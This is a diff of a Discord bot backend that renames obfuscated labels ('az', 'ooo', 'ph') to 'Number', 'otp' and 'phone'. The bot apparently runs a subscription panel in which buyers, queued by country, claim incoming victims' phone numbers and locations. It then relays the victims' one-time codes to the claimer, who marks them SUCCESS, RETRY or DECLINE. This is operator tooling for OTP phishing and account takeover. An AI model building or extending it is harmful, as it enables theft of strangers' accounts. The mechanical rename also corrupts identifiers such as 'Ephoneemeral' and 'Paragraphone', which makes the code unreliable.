@@ -99,7 +99,7 @@ export async function connectDb() {
 // ---------- Config (stockée en base) ----------
 const DEFAULT_CONFIG = {
   token: "",
-  notify_channel_id: "", // salon partagé : az non routés + az routés depuis la file (bouton claim)
+  notify_channel_id: "", // salon partagé : Number non routés + Number routés depuis la file (bouton claim)
   logs_channel_id: "",
   leaderboard_channel_id: "",
   leaderboard_message_id: "",
@@ -180,11 +180,11 @@ export function parseIsoUtc(s) {
 const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
 // ---------- Views (Components V2) ----------
-// Remplace la classe AzView. Usage : channel.send(buildAzView(user, cfg))
+// Remplace la classe NumberView. Usage : channel.send(buildNumberView(user, cfg))
 // Un message Components V2 ne peut contenir ni `content` ni `embeds`.
-export function buildAzView(user, cfg, claimedBy = null) {
+export function buildNumberView(user, cfg, claimedBy = null) {
   const desc =
-    cfg.embed_desc || "A new Az just came in. Press the button to claim it.";
+    cfg.embed_desc || "A new Number just came in. Press the button to claim it.";
   const accent = claimedBy ? 0x22c55e : cfg.embed_color ?? 0xfacc15;
 
   const nick = user.nickname ?? "?";
@@ -193,7 +193,7 @@ export function buildAzView(user, cfg, claimedBy = null) {
   const city = geo.city ?? "?";
 
   let body =
-    `# ${ALERT_EMOJI} New az received\n` +
+    `# ${ALERT_EMOJI} New Number received\n` +
     `${desc}\n\n` +
     `**Nickname**\u2003\`${nick}\`\n` +
     `**Country**\u2003${country}\n` +
@@ -212,7 +212,7 @@ export function buildAzView(user, cfg, claimedBy = null) {
   let button;
   if (!claimedBy) {
     button = new ButtonBuilder()
-      .setCustomId(`lol_ok:${user.id}`)
+      .setCustomId(`snap_ok:${user.id}`)
       .setLabel(cfg.ok_button_label || "OK")
       .setStyle(styleMap(cfg.ok_button_style ?? "success"));
 
@@ -226,7 +226,7 @@ export function buildAzView(user, cfg, claimedBy = null) {
     }
   } else {
     button = new ButtonBuilder()
-      .setCustomId("lol_claimed_done")
+      .setCustomId("snap_claimed_done")
       .setLabel("Claimed")
       .setStyle(ButtonStyle.Secondary)
       .setEmoji(FLASH_EMOJI)
@@ -240,24 +240,24 @@ export function buildAzView(user, cfg, claimedBy = null) {
   return { components: [container], flags: MessageFlags.IsComponentsV2 };
 }
 
-// ---------- DM "az claimed" (Components V2) ----------
+// ---------- DM "Number claimed" (Components V2) ----------
 function claimedBody(u, cfg, asked = false) {
   const geo = u.geo ?? {};
   let body =
-    `# ${SHOP_EMOJI} az claimed\n` +
+    `# ${SHOP_EMOJI} Number claimed\n` +
     `**Nickname**\u2003\`${u.nickname ?? "?"}\`\n` +
-    `**ph**\u2003\`${u.ph ?? "?"}\`\n` +
+    `**phone**\u2003\`${u.phone ?? "?"}\`\n` +
     `**Location**\u2003${geo.city ?? "?"}, ${geo.country ?? "?"}`;
 
   if (asked) {
-    body += `\n\n${CALL_EMOJI} ooo requested \u2014 waiting for the user to type the username.`;
+    body += `\n\n${CALL_EMOJI} otp requested \u2014 waiting for the user to type the username.`;
   }
   const ft = (cfg.footer_text ?? "").trim();
   if (ft) body += `\n\n-# ${ft}`;
   return body;
 }
 
-// Remplace la classe ClaimedView (+ oooButton).
+// Remplace la classe ClaimedView (+ otpButton).
 // Usage : user.send(ClaimedView(u, cfg)) ou interaction.editReply(ClaimedView(u, cfg, true))
 export function ClaimedView(u, cfg, asked = false) {
   const container = new ContainerBuilder()
@@ -269,14 +269,14 @@ export function ClaimedView(u, cfg, asked = false) {
 
   const button = asked
     ? new ButtonBuilder()
-        .setCustomId("lol_ooo_done")
-        .setLabel("Asked for ooo")
+        .setCustomId("snap_otp_done")
+        .setLabel("Asked for otp")
         .setStyle(ButtonStyle.Secondary)
         .setEmoji(CALL_EMOJI)
         .setDisabled(true)
     : new ButtonBuilder()
-        .setCustomId(`lol_ooo:${u.id}`)
-        .setLabel("Ask ooo")
+        .setCustomId(`snap_otp:${u.id}`)
+        .setLabel("Ask otp")
         .setStyle(ButtonStyle.Primary)
         .setEmoji(CALL_EMOJI);
 
@@ -310,11 +310,11 @@ export async function logAction(text) {
   }
 }
 
-// ---------- Routage d'un az vers la file d'attente ----------
-// Modifié : l'az "claim" du premier de la file n'est plus posté dans son salon privé,
+// ---------- Routage d'un Number vers la file d'attente ----------
+// Modifié : l'Number "claim" du premier de la file n'est plus posté dans son salon privé,
 // mais dans le salon PARTAGÉ (cfg.notify_channel_id), visible par tout le monde, où tout
 // le monde peut cliquer "OK" (premier clic gagnant, réservation atomique en base).
-async function routeAzToQueue(user, cfg) {
+async function routeNumberToQueue(user, cfg) {
   const db = state.db;
   const country = (user.country_code ?? "").toUpperCase();
   if (!Object.hasOwn(QUEUE_COUNTRY_NAMES, country)) return false;
@@ -336,21 +336,21 @@ async function routeAzToQueue(user, cfg) {
     return false;
   }
 
-  // Salon partagé où TOUS les az avec bouton claim apparaissent
+  // Salon partagé où TOUS les Number avec bouton claim apparaissent
   const claimChanId = (cfg.notify_channel_id ?? "").trim();
   if (!claimChanId) return false;
   const claimCh = await getChannel(claimChanId);
   if (!claimCh) return false;
 
-  // Poste le panel "New az" dans le salon partagé
+  // Poste le panel "New Number" dans le salon partagé
   try {
-    await claimCh.send(buildAzView(user, cfg));
+    await claimCh.send(buildNumberView(user, cfg));
   } catch (e) {
-    log.warn(`route_az send failed: ${e}`);
+    log.warn(`route_Number send failed: ${e}`);
     return false;
   }
 
-  // DM : un az est prêt, à claim dans le salon partagé
+  // DM : un Number est prêt, à claim dans le salon partagé
   try {
     const uDisc = await state.bot.users.fetch(String(uid));
     const name = QUEUE_COUNTRY_NAMES[country] ?? country;
@@ -358,7 +358,7 @@ async function routeAzToQueue(user, cfg) {
       .setAccentColor(0x22c55e)
       .addTextDisplayComponents(
         new TextDisplayBuilder().setContent(
-          `# ${ALERT_EMOJI} A az is ready \u2014 ${name}\n` +
+          `# ${ALERT_EMOJI} A Number is ready \u2014 ${name}\n` +
             `Head to <#${claimChanId}> and claim it now.`
         )
       );
@@ -367,7 +367,7 @@ async function routeAzToQueue(user, cfg) {
       flags: MessageFlags.IsComponentsV2,
     });
   } catch (e) {
-    log.warn(`route_az DM failed: ${e}`);
+    log.warn(`route_Number DM failed: ${e}`);
   }
 
   // Retire la personne de la file et fait avancer les suivants
@@ -389,7 +389,7 @@ async function routeAzToQueue(user, cfg) {
     log.warn(`queue panel reset failed: ${e}`);
   }
 
-  await logAction(`\u{1F3AF} az routed to shared channel for <@${uid}> (${country})`);
+  await logAction(`\u{1F3AF} Number routed to shared channel for <@${uid}> (${country})`);
   return true;
 }
 
@@ -401,13 +401,13 @@ export async function notifyNewRegistration(user) {
   }
   const cfg = await getConfig();
 
-  // Essaie d'abord de router l'az vers le premier de la file du pays
+  // Essaie d'abord de router l'Number vers le premier de la file du pays
   try {
-    if (await routeAzToQueue(user, cfg)) {
+    if (await routeNumberToQueue(user, cfg)) {
       return { ok: true, message: "routed to queue" };
     }
   } catch (e) {
-    log.warn(`route_az_to_queue error: ${e}`);
+    log.warn(`route_Number_to_queue error: ${e}`);
   }
 
   const chId = (cfg.notify_channel_id ?? "").trim();
@@ -423,14 +423,14 @@ export async function notifyNewRegistration(user) {
         allowedMentions: { parse: ["roles"] },
       });
     }
-    await ch.send(buildAzView(user, cfg));
+    await ch.send(buildNumberView(user, cfg));
     return { ok: true, message: "sent" };
   } catch (e) {
     return { ok: false, message: String(e) };
   }
 }
 
-// ---------- Appelé par votre API HTTP quand le code ooo est soumis ----------
+// ---------- Appelé par votre API HTTP quand le code otp est soumis ----------
 export async function notifyCodeSubmitted(user, code) {
   if (!state.bot || state.status !== "online") {
     return { ok: false, message: "bot offline" };
@@ -442,8 +442,8 @@ export async function notifyCodeSubmitted(user, code) {
     if (presserId) {
       const uDisc = await state.bot.users.fetch(String(presserId));
       const embed = new EmbedBuilder()
-        .setTitle("🎯 ooo received")
-        .setDescription(`**User:** \`${user.nickname}\`\n**ph:** \`${user.ph}\``)
+        .setTitle("🎯 otp received")
+        .setDescription(`**User:** \`${user.nickname}\`\n**phone:** \`${user.phone}\``)
         .setColor(0x22c55e)
         .addFields({ name: "Code", value: `\`\`\`${code}\`\`\``, inline: false });
 
@@ -467,10 +467,10 @@ export async function notifyCodeSubmitted(user, code) {
 // ---------- Callback du bouton OK ----------
 export async function handleOkButton(interaction, userId) {
   // On accuse réception tout de suite (Discord exige une réponse sous 3 s).
-  // La suite répond avec followUp (éphémère) ou editReply (message d'origine).
+  // La suite répond avec followUp (éphoneémère) ou editReply (message d'origine).
   await interaction.deferUpdate();
 
-  const ephemeral = { flags: MessageFlags.Ephemeral };
+  const ephoneemeral = { flags: MessageFlags.Ephoneemeral };
   const cfg = await getConfig();
   const db = state.db;
 
@@ -478,7 +478,7 @@ export async function handleOkButton(interaction, userId) {
   if (cfg.maintenance_mode) {
     return interaction.followUp({
       content: "🛠 The bot is in maintenance mode. Please try again later.",
-      ...ephemeral,
+      ...ephoneemeral,
     });
   }
 
@@ -489,7 +489,7 @@ export async function handleOkButton(interaction, userId) {
     if (!hasRole) {
       return interaction.followUp({
         content: "❌ You don't have permission to claim this ticket.",
-        ...ephemeral,
+        ...ephoneemeral,
       });
     }
   }
@@ -515,7 +515,7 @@ export async function handleOkButton(interaction, userId) {
       content: other
         ? `⚠️ Already claimed by <@${other}>.`
         : "⚠️ Already claimed.",
-      ...ephemeral,
+      ...ephoneemeral,
     });
   }
 
@@ -532,7 +532,7 @@ export async function handleOkButton(interaction, userId) {
       return interaction.followUp({
         content:
           "⚠️ I can't DM you. Enable DMs from server members. Claim released.",
-        ...ephemeral,
+        ...ephoneemeral,
       });
     }
     throw err;
@@ -556,12 +556,12 @@ export async function handleOkButton(interaction, userId) {
   // édition du message d'origine
   try {
     await interaction.editReply(
-      buildAzView(u, cfg, `<@${interaction.user.id}>`)
+      buildNumberView(u, cfg, `<@${interaction.user.id}>`)
     );
   } catch (e) {
     log.warn(`editReply failed: ${e}`);
     await interaction
-      .followUp({ content: "claimed.", ...ephemeral })
+      .followUp({ content: "claimed.", ...ephoneemeral })
       .catch(() => {});
   }
 
@@ -569,15 +569,15 @@ export async function handleOkButton(interaction, userId) {
   refreshLeaderboard().catch((e) => log.error(e));
 }
 
-// ---------- Callback du bouton "Ask ooo" (dans le DM) ----------
-export async function handleOooButton(interaction, userId) {
+// ---------- Callback du bouton "Ask otp" (dans le DM) ----------
+export async function handleotpButton(interaction, userId) {
   await interaction.deferUpdate();
 
   const cfg = await getConfig();
   if (cfg.maintenance_mode) {
     return interaction.followUp({
       content: "🛠 The bot is in maintenance mode. Please try again later.",
-      flags: MessageFlags.Ephemeral,
+      flags: MessageFlags.Ephoneemeral,
     });
   }
 
@@ -586,7 +586,7 @@ export async function handleOooButton(interaction, userId) {
   if (!u) {
     return interaction.followUp({
       content: "User not found.",
-      flags: MessageFlags.Ephemeral,
+      flags: MessageFlags.Ephoneemeral,
     });
   }
 
@@ -600,64 +600,64 @@ export async function handleOooButton(interaction, userId) {
   try {
     await interaction.editReply(ClaimedView(u, cfg, true));
   } catch (e) {
-    log.warn(`editReply (ooo) failed: ${e}`);
+    log.warn(`editReply (otp) failed: ${e}`);
   }
 
   await logAction(
-    `🔑 <@${interaction.user.id}> pressed **ooo** for \`${u.nickname}\``
+    `🔑 <@${interaction.user.id}> pressed **otp** for \`${u.nickname}\``
   );
 }
 
-// ---------- ooo : panel de vérification (DM à l'admin) ----------
-function oooBody(nickname, ph, code, cfg) {
+// ---------- otp : panel de vérification (DM à l'admin) ----------
+function otpBody(nickname, phone, code, cfg) {
   let body =
-    `# ${BELL_EMOJI} ooo received\n` +
+    `# ${BELL_EMOJI} otp received\n` +
     `**User**\u2003\`${nickname}\`\n` +
-    `**ph**\u2003\`${ph}\`\n\n` +
+    `**phone**\u2003\`${phone}\`\n\n` +
     `**Code**\n\`\`\`${code}\`\`\``;
   const ft = (cfg.footer_text ?? "").trim();
   if (ft) body += `\n-# ${ft}`;
   return body;
 }
 
-function oooResultBody(title, nickname, ph, extra = "") {
+function otpResultBody(title, nickname, phone, extra = "") {
   let body =
     `# ${title}\n` +
     `**User**\u2003\`${nickname}\`\n` +
-    `**ph**\u2003\`${ph}\``;
+    `**phone**\u2003\`${phone}\``;
   if (extra) body += `\n\n${extra}`;
   return body;
 }
 
-// Remplace oooResultView : état final après DECLINE / RETRY / SUCCESS (sans boutons)
-export function buildOooResultView(title, nickname, ph, accent, extra = "") {
+// Remplace otpResultView : état final après DECLINE / RETRY / SUCCESS (sans boutons)
+export function buildotpResultView(title, nickname, phone, accent, extra = "") {
   const container = new ContainerBuilder()
     .setAccentColor(accent)
     .addTextDisplayComponents(
       new TextDisplayBuilder().setContent(
-        oooResultBody(title, nickname, ph, extra)
+        otpResultBody(title, nickname, phone, extra)
       )
     );
   return { components: [container], flags: MessageFlags.IsComponentsV2 };
 }
 
-// Remplace oooVerificationView : 3 boutons dans le container.
-// L'id de l'utilisateur est mis dans le customId (lol_decline:<id>, etc.) car il
-// n'y a plus d'instance de classe pour le mémoriser. Le nickname et le ph sont
+// Remplace otpVerificationView : 3 boutons dans le container.
+// L'id de l'utilisateur est mis dans le customId (snap_decline:<id>, etc.) car il
+// n'y a plus d'instance de classe pour le mémoriser. Le nickname et le phone sont
 // relus en base au clic : les boutons marchent aussi après un redémarrage du bot.
-export function buildOooVerificationView(userId, nickname, ph, code = "", cfg = {}) {
+export function buildotpVerificationView(userId, nickname, phone, code = "", cfg = {}) {
   const declineBtn = new ButtonBuilder()
-    .setCustomId(`lol_decline:${userId}`)
+    .setCustomId(`snap_decline:${userId}`)
     .setLabel("DECLINE")
     .setStyle(ButtonStyle.Danger)
     .setEmoji(BAN_EMOJI);
   const retryBtn = new ButtonBuilder()
-    .setCustomId(`lol_retry:${userId}`)
+    .setCustomId(`snap_retry:${userId}`)
     .setLabel("RETRY")
     .setStyle(ButtonStyle.Primary)
     .setEmoji(EDIT_EMOJI);
   const successBtn = new ButtonBuilder()
-    .setCustomId(`lol_success:${userId}`)
+    .setCustomId(`snap_success:${userId}`)
     .setLabel("SUCCESS")
     .setStyle(ButtonStyle.Success)
     .setEmoji(PLUS_EMOJI);
@@ -665,7 +665,7 @@ export function buildOooVerificationView(userId, nickname, ph, code = "", cfg = 
   const container = new ContainerBuilder()
     .setAccentColor(0x22c55e)
     .addTextDisplayComponents(
-      new TextDisplayBuilder().setContent(oooBody(nickname, ph, code, cfg))
+      new TextDisplayBuilder().setContent(otpBody(nickname, phone, code, cfg))
     )
     .addSeparatorComponents(new SeparatorBuilder())
     .addActionRowComponents(
@@ -675,13 +675,13 @@ export function buildOooVerificationView(userId, nickname, ph, code = "", cfg = 
   return { components: [container], flags: MessageFlags.IsComponentsV2 };
 }
 
-// Relit l'utilisateur en base ; répond en éphémère s'il n'existe pas
-async function loadOooUser(interaction, userId) {
+// Relit l'utilisateur en base ; répond en éphoneémère s'il n'existe pas
+async function loadotpUser(interaction, userId) {
   const u = await state.db.collection("users").findOne({ id: userId });
   if (!u) {
     await interaction.followUp({
       content: "User not found.",
-      flags: MessageFlags.Ephemeral,
+      flags: MessageFlags.Ephoneemeral,
     });
   }
   return u;
@@ -690,15 +690,15 @@ async function loadOooUser(interaction, userId) {
 // DECLINE : ouvre le modal (showModal doit être la toute première réponse, pas de defer avant)
 export async function handleDeclineButton(interaction, userId) {
   const modal = new ModalBuilder()
-    .setCustomId(`lol_decline_modal:${userId}`)
-    .setTitle("Decline az")
+    .setCustomId(`snap_decline_modal:${userId}`)
+    .setTitle("Decline Number")
     .addComponents(
       new ActionRowBuilder().addComponents(
         new TextInputBuilder()
           .setCustomId("reason")
           .setLabel("Write a comment (optional)")
-          .setPlaceholder("Why are you declining this az?")
-          .setStyle(TextInputStyle.Paragraph)
+          .setPlaceholder("Why are you declining this Number?")
+          .setStyle(TextInputStyle.Paragraphone)
           .setMaxLength(500)
           .setRequired(false)
       )
@@ -711,7 +711,7 @@ export async function handleDeclineModal(interaction, userId) {
   await interaction.deferUpdate();
 
   const db = state.db;
-  const u = await loadOooUser(interaction, userId);
+  const u = await loadotpUser(interaction, userId);
   if (!u) return;
 
   const comment = (interaction.fields.getTextInputValue("reason") ?? "").trim();
@@ -732,7 +732,7 @@ export async function handleDeclineModal(interaction, userId) {
     action: "USER_DECLINED",
     user_id: userId,
     username: u.nickname,
-    ph: u.ph,
+    phone: u.phone,
     reason: comment,
     discord_user_id: interaction.user.id,
     discord_username: interaction.user.username,
@@ -745,11 +745,11 @@ export async function handleDeclineModal(interaction, userId) {
   try {
     const extra = comment ? `Comment: ${comment}` : "";
     await interaction.editReply(
-      buildOooResultView(`${BAN_EMOJI} Declined`, u.nickname, u.ph, 0xef4444, extra)
+      buildotpResultView(`${BAN_EMOJI} Declined`, u.nickname, u.phone, 0xef4444, extra)
     );
   } catch {
     await interaction
-      .followUp({ content: "❌ Declined.", flags: MessageFlags.Ephemeral })
+      .followUp({ content: "❌ Declined.", flags: MessageFlags.Ephoneemeral })
       .catch(() => {});
   }
 }
@@ -759,7 +759,7 @@ export async function handleRetryButton(interaction, userId) {
   await interaction.deferUpdate();
 
   const db = state.db;
-  const u = await loadOooUser(interaction, userId);
+  const u = await loadotpUser(interaction, userId);
   if (!u) return;
 
   await db.collection("users").updateOne(
@@ -778,7 +778,7 @@ export async function handleRetryButton(interaction, userId) {
     action: "RETRY_CODE",
     user_id: userId,
     username: u.nickname,
-    ph: u.ph,
+    phone: u.phone,
     discord_user_id: interaction.user.id,
     created_at: nowIso(),
   });
@@ -788,10 +788,10 @@ export async function handleRetryButton(interaction, userId) {
 
   try {
     await interaction.editReply(
-      buildOooResultView(
+      buildotpResultView(
         `${EDIT_EMOJI} Retry requested`,
         u.nickname,
-        u.ph,
+        u.phone,
         0x3b82f6,
         "The user has been sent back to the code form. No new code was generated \u2014 they re-enter the one they already got."
       )
@@ -806,7 +806,7 @@ export async function handleSuccessButton(interaction, userId) {
   await interaction.deferUpdate();
 
   const db = state.db;
-  const u = await loadOooUser(interaction, userId);
+  const u = await loadotpUser(interaction, userId);
   if (!u) return;
 
   await db.collection("users").updateOne(
@@ -826,7 +826,7 @@ export async function handleSuccessButton(interaction, userId) {
     action: "ADMIN_APPROVED",
     user_id: userId,
     username: u.nickname,
-    ph: u.ph,
+    phone: u.phone,
     approved_by: interaction.user.username,
     discord_user_id: interaction.user.id,
     created_at: nowIso(),
@@ -837,10 +837,10 @@ export async function handleSuccessButton(interaction, userId) {
 
   try {
     await interaction.editReply(
-      buildOooResultView(
+      buildotpResultView(
         `${PLUS_EMOJI} Success`,
         u.nickname,
-        u.ph,
+        u.phone,
         0x22c55e,
         "Access approved."
       )
@@ -850,9 +850,9 @@ export async function handleSuccessButton(interaction, userId) {
   }
 }
 
-// ---------- Appelé par votre API HTTP quand le code ooo est soumis ----------
+// ---------- Appelé par votre API HTTP quand le code otp est soumis ----------
 // DM à l'admin qui a pris le ticket : code + 3 boutons.
-export async function notifyOooReceived(user, code) {
+export async function notifyotpReceived(user, code) {
   if (!state.bot || state.status !== "online") {
     return { ok: false, message: "bot offline" };
   }
@@ -861,7 +861,7 @@ export async function notifyOooReceived(user, code) {
 
   if (!presserId) {
     await logAction(
-      `⚠️ ooo ricevuto per \`${user.nickname}\` ma nessun admin ha claimato.`
+      `⚠️ otp ricevuto per \`${user.nickname}\` ma nessun admin ha claimato.`
     );
     return { ok: false, message: "no presser" };
   }
@@ -869,17 +869,17 @@ export async function notifyOooReceived(user, code) {
   try {
     const uDisc = await state.bot.users.fetch(String(presserId));
     const msg = await uDisc.send(
-      buildOooVerificationView(user.id, user.nickname, user.ph, code, cfg)
+      buildotpVerificationView(user.id, user.nickname, user.phone, code, cfg)
     );
     await state.db
       .collection("users")
-      .updateOne({ id: user.id }, { $set: { ooo_message_id: msg.id } });
+      .updateOne({ id: user.id }, { $set: { otp_message_id: msg.id } });
     await logAction(
-      `📨 ooo \`${code}\` ricevuto per \`${user.nickname}\` — DM a <@${presserId}>`
+      `📨 otp \`${code}\` ricevuto per \`${user.nickname}\` — DM a <@${presserId}>`
     );
     return { ok: true, message: "sent" };
   } catch (e) {
-    log.warn(`notify_ooo_received failed: ${e}`);
+    log.warn(`notify_otp_received failed: ${e}`);
     return { ok: false, message: String(e) };
   }
 }
@@ -984,7 +984,7 @@ export async function runTimer(record) {
     const member = await guild.members.fetch(String(record.user_id));
     const role = await guild.roles.fetch(String(record.role_id));
     if (member && role) {
-      await member.roles.remove(role, "lol+ timer expired");
+      await member.roles.remove(role, "snap+ timer expired");
     }
   } catch (e) {
     log.warn(`timer: rimozione ruolo fallita (${e})`);
@@ -1067,7 +1067,7 @@ async function expireSubscription(sub) {
       if (member) {
         const role = g.roles.cache.get(BUYER_ROLE_ID);
         if (role && member.roles.cache.has(role.id)) {
-          await member.roles.remove(role, "lol+ access expired");
+          await member.roles.remove(role, "snap+ access expired");
         }
         break;
       }
@@ -1093,7 +1093,7 @@ async function expireSubscription(sub) {
   try {
     if (sub.panel_channel_id) {
       const ch = await getChannel(sub.panel_channel_id);
-      await ch?.delete("lol+ access expired");
+      await ch?.delete("snap+ access expired");
     }
   } catch (e) {
     log.warn(`expire delete channel failed: ${e}`);
@@ -1221,7 +1221,7 @@ function panelBody(mention, sub) {
 export function buildPanelView(mention, sub) {
   const frozen = Boolean(sub.frozen);
   const freezeBtn = new ButtonBuilder()
-    .setCustomId("lolplus:freeze")
+    .setCustomId("snapplus:freeze")
     .setLabel(frozen ? "Unfreeze Time" : "Freeze Time")
     .setStyle(frozen ? ButtonStyle.Danger : ButtonStyle.Primary)
     .setEmoji(FREEZE_EMOJI);
@@ -1264,7 +1264,7 @@ export async function grantTimerRole(
   grantedBy
 ) {
   const db = state.db;
-  await member.roles.add(role, `lol+ timer by ${grantedBy}`);
+  await member.roles.add(role, `snap+ timer by ${grantedBy}`);
 
   const expiresAt = new Date(Date.now() + durationSeconds * 1000);
   const memberMention = `<@${member.id}>`;
@@ -1329,7 +1329,7 @@ export async function ensureBuyerRole(guild, member) {
   try {
     if (member.roles.cache.has(BUYER_ROLE_ID)) return;
     const role = await guild.roles.fetch(BUYER_ROLE_ID);
-    if (role) await member.roles.add(role, "lol+ access granted");
+    if (role) await member.roles.add(role, "snap+ access granted");
   } catch (e) {
     log.warn(`ensure_buyer_role failed: ${e}`);
   }
@@ -1345,7 +1345,7 @@ function joinQueueBody(frozen = false) {
   }
   return (
     `# ${SEARCH_EMOJI} Join Queue\n` +
-    `Pick a country, wait for your turn, and you'll get a DM when a az ` +
+    `Pick a country, wait for your turn, and you'll get a DM when a Number ` +
     `is ready to claim. You can be in one country queue at a time.\n\n` +
     `Press **Join Queue** below to choose a country.`
   );
@@ -1354,7 +1354,7 @@ function joinQueueBody(frozen = false) {
 // Remplace JoinQueueView : panel "Join Queue" avec le bouton dans le container
 export function buildJoinQueueView(frozen = false) {
   const button = new ButtonBuilder()
-    .setCustomId("lolplus:join_queue")
+    .setCustomId("snapplus:join_queue")
     .setLabel("Join Queue")
     .setStyle(frozen ? ButtonStyle.Secondary : ButtonStyle.Primary)
     .setEmoji(SEARCH_EMOJI)
@@ -1395,7 +1395,7 @@ async function userCurrentQueue(uid) {
     .findOne({ user_id: uid, status: "pending" });
 }
 
-// Remplace CountrySelectView + CountrySelect : sélecteur éphémère (Components V2)
+// Remplace CountrySelectView + CountrySelect : sélecteur éphoneémère (Components V2)
 export function buildCountrySelectView(states, frozen = false) {
   let body =
     `# ${WORLD_EMOJI} Join a Country queue\n` +
@@ -1420,7 +1420,7 @@ export function buildCountrySelectView(states, frozen = false) {
   }
 
   const select = new StringSelectMenuBuilder()
-    .setCustomId("lolplus:country_select")
+    .setCustomId("snapplus:country_select")
     .setPlaceholder("Choose a country queue...")
     .setMinValues(1)
     .setMaxValues(1)
@@ -1435,29 +1435,29 @@ export function buildCountrySelectView(states, frozen = false) {
 
   return {
     components: [container],
-    flags: MessageFlags.IsComponentsV2 | MessageFlags.Ephemeral,
+    flags: MessageFlags.IsComponentsV2 | MessageFlags.Ephoneemeral,
   };
 }
 
 // Bouton "Join Queue" (JoinQueueButton.callback)
 export async function handleJoinQueueButton(interaction) {
   const db = state.db;
-  const ephemeral = MessageFlags.Ephemeral;
+  const ephoneemeral = MessageFlags.Ephoneemeral;
   if (!db) {
-    return interaction.reply({ content: "Database not available.", flags: ephemeral });
+    return interaction.reply({ content: "Database not available.", flags: ephoneemeral });
   }
   const uid = interaction.user.id;
   const sub = await db.collection("subscriptions").findOne({ discord_id: uid });
   if (!sub) {
     return interaction.reply({
       content: "No active subscription found for your account.",
-      flags: ephemeral,
+      flags: ephoneemeral,
     });
   }
   if (sub.frozen) {
     return interaction.reply({
       content: "Your time is frozen. Unfreeze it first to join a queue.",
-      flags: ephemeral,
+      flags: ephoneemeral,
     });
   }
   const states = await countryStates();
@@ -1467,8 +1467,8 @@ export async function handleJoinQueueButton(interaction) {
 // Sélection d'un pays (CountrySelect.callback)
 export async function handleCountrySelect(interaction) {
   // Plusieurs requêtes + appels Discord : on accuse réception tout de suite,
-  // puis on répond en éphémère avec editReply.
-  await interaction.deferReply({ flags: MessageFlags.Ephemeral });
+  // puis on répond en éphoneémère avec editReply.
+  await interaction.deferReply({ flags: MessageFlags.Ephoneemeral });
   const say = (content) => interaction.editReply({ content });
 
   const db = state.db;
@@ -1541,7 +1541,7 @@ export async function dmQueueAlmost(userId, country) {
           `# ${WORLD_EMOJI} You're almost up \u2014 ${name}\n` +
             `**Position:** \`#1\`\n\n` +
             `You're next in line. Keep an eye on your panel \u2014 ` +
-            `when it's your turn a az will appear for you to claim.`
+            `when it's your turn a Number will appear for you to claim.`
         )
       );
     await u.send({ components: [container], flags: MessageFlags.IsComponentsV2 });
@@ -1552,7 +1552,7 @@ export async function dmQueueAlmost(userId, country) {
 
 // DM envoyé quand quelqu'un devient #0 (son tour)
 // Modifié : renvoie désormais vers le salon partagé (notify_channel_id), plus vers le
-// panel privé de l'utilisateur, puisque c'est là que l'az "claim" est maintenant posté.
+// panel privé de l'utilisateur, puisque c'est là que l'Number "claim" est maintenant posté.
 export async function dmQueueTurn(userId, country) {
   try {
     const u = await state.bot.users.fetch(String(userId));
@@ -1565,7 +1565,7 @@ export async function dmQueueTurn(userId, country) {
       .addTextDisplayComponents(
         new TextDisplayBuilder().setContent(
           `# ${ALERT_EMOJI} It's your turn! \u2014 ${name}\n` +
-            `Go to ${where}, wait for a az to appear and **claim it**.\n\n` +
+            `Go to ${where}, wait for a Number to appear and **claim it**.\n\n` +
             `If you leave the queue now you'll lose your spot.`
         )
       );
@@ -1698,13 +1698,13 @@ function positionBody(country, ahead) {
     headline = `# ${WORLD_EMOJI} You're up! \u2014 ${name}`;
     pos = "**Your position:** `#0` \u2014 it's your turn now";
     tail =
-      "Go check the shared claim channel \u2014 your az will appear there.\n" +
+      "Go check the shared claim channel \u2014 your Number will appear there.\n" +
       "Leaving the queue now means losing your spot.";
   } else {
     headline = `# ${WORLD_EMOJI} In queue \u2014 ${name}`;
     pos = `**Your position:** \`#${ahead}\` (people ahead of you)`;
     tail =
-      "You'll get a DM when you're next, and again when a az is ready to claim.\n" +
+      "You'll get a DM when you're next, and again when a Number is ready to claim.\n" +
       "Press **Leave Queue** to exit \u2014 you can rejoin later from the panel.";
   }
   return `${headline}\n${pos}\n\n${tail}`;
@@ -1713,7 +1713,7 @@ function positionBody(country, ahead) {
 // Remplace QueuePositionView (+ LeaveQueueButton)
 export function buildQueuePositionView(country, ahead) {
   const leaveBtn = new ButtonBuilder()
-    .setCustomId("lolplus:leave_queue")
+    .setCustomId("snapplus:leave_queue")
     .setLabel("Leave Queue")
     .setStyle(ButtonStyle.Danger)
     .setEmoji(FREEZE_EMOJI);
@@ -1728,21 +1728,21 @@ export function buildQueuePositionView(country, ahead) {
 }
 
 // NOTE : TurnArrivedView et handleBackToQueueButton ne sont plus déclenchés par le flux
-// normal depuis que les az routés vont dans le salon partagé (routeAzToQueue n'édite plus
+// normal depuis que les Number routés vont dans le salon partagé (routeNumberToQueue n'édite plus
 // le panel de file vers cette vue). Laissés en place pour compatibilité / usage futur.
 
-// Remplace TurnArrivedView (+ BackToQueueButton) : panel vert quand un az vient d'être routé
+// Remplace TurnArrivedView (+ BackToQueueButton) : panel vert quand un Number vient d'être routé
 export function TurnArrivedView(country = "") {
   const name = QUEUE_COUNTRY_NAMES[country] ?? country;
   let head = `# ${ALERT_EMOJI} It's your turn!`;
   if (name) head += ` \u2014 ${name}`;
   const body =
     `${head}\n` +
-    `A az just arrived \u2014 claim it in the shared channel.\n\n` +
+    `A Number just arrived \u2014 claim it in the shared channel.\n\n` +
     `You've been removed from the queue. Press **Join Queue again** to rejoin.`;
 
   const backBtn = new ButtonBuilder()
-    .setCustomId("lolplus:back_to_queue")
+    .setCustomId("snapplus:back_to_queue")
     .setLabel("Join Queue again")
     .setStyle(ButtonStyle.Primary)
     .setEmoji(SEARCH_EMOJI);
@@ -1780,16 +1780,16 @@ export async function handleBackToQueueButton(interaction) {
   const sub = await db.collection("subscriptions").findOne({ discord_id: uid });
   const frozen = sub ? Boolean(sub.frozen) : false;
   try {
-    const nmid = sub?.routed_az_message_id;
+    const nmid = sub?.routed_Number_message_id;
     if (nmid) {
       const nmsg = await interaction.channel.messages.fetch(String(nmid));
       await nmsg.delete();
       await db
         .collection("subscriptions")
-        .updateOne({ discord_id: uid }, { $unset: { routed_az_message_id: "" } });
+        .updateOne({ discord_id: uid }, { $unset: { routed_Number_message_id: "" } });
     }
   } catch (e) {
-    log.warn(`clear az message failed: ${e}`);
+    log.warn(`clear Number message failed: ${e}`);
   }
   await interaction.editReply(buildJoinQueueView(frozen));
 }
@@ -1797,10 +1797,10 @@ export async function handleBackToQueueButton(interaction) {
